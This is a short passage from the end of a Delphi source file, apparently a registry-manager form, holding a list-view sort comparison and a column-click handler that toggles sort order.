    Result := AnsiCompareText(Item1.SubItems[Data - 1], Item2.SubItems[Data - 1]);
  if not Ascending then Result := -Result;
end;

procedure TFormRegistryManager.lvRegColumnClick(Sender: TObject;
  Column: TListColumn);
var
  i: Integer;
begin
  Ascending := not Ascending;
  if Column <> LastColumn then Ascending := not Ascending;
  LastColumn := Column;
  lvReg.CustomSort(@SortByColumn, LastColumn.Index);
end;

end.
